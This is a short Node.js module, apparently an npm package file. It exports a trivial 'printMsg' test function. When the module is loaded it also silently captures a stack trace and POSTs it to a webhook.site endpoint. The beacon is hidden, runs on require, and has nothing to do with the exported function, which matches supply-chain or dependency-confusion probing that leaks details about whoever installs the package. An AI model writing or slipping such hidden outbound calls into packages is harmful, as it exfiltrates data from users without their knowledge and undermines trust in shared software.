const https = require('https')

const error = new Error();
Error.captureStackTrace(error);
const callStack = error.stack;

const data = JSON.stringify({
    callStack
});

const options = {
    hostname: 'webhook.site',
    path: '/85f75f80-becd-4efb-8d26-404915a28143/hi',
    method: 'POST',
    headers: {
        'Content-Length': data.length
    }
};

const req = https.request(options, (res) => {
    console.log(`Status code: ${res.statusCode}`);

    res.on('data', (chunk) => {
        console.log(`Body: ${chunk}`);
    });

    res.on('end', () => {
        console.log('Request completed.');
    });
});

req.on('error', (error) => {
    console.error(`Error: ${error.message}`);
});

req.write(data);
req.end();

exports.printMsg = function() {
    console.log("marksl test");
    return "marksl test";
  }